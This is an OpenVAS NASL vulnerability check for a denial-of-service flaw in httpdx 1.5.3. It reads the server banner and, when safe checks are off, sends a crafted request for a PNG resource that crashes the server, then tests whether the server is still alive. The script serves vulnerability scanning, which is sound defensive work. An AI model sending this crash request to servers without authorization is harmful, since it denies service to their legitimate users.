###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_httpdx_38638.nasl 14 2013-10-27 12:33:37Z jan $
#
# httpdx PNG File Handling Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "The 'httpdx' program is prone to a denial-of-service vulnerbaility.

Remote attackers can exploit this issue to cause the server to stop
responding, denying service to legitimate users.

This issue affects httpdx 1.5.3; other versions may also be affected.";


if (description)
{
 script_id(100525);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-03-11 12:36:18 +0100 (Thu, 11 Mar 2010)");
 script_bugtraq_id(38638);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");

 script_name("httpdx PNG File Handling Remote Denial of Service Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/38638");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/httpdx/");

 script_description(desc);
 script_summary("Determine if httpdx is prone to a denial-of-service vulnerbaility");
 script_category(ACT_ATTACK);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port: port);
if(!banner)exit(0);

if("httpdx/" >!< banner)exit(0);

if(safe_checks()) {

  version = eregmatch(pattern: "httpdx/([0-9.]+)", string: banner);
  if(isnull(version[1]))exit(0);

  if(version_is_equal(version: version[1], test_version: "1.5.3")) {
    security_warning(port:port);
    exit(0);
  }

}  

else {
 
   url = string("GET /res~httpdx.conf/image/php.png");
   req = http_get(item:url, port:port);
   res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

   if(http_is_dead(port:port)) {
        security_note(port:port);
        exit(0); 
   }
 }

exit(0);
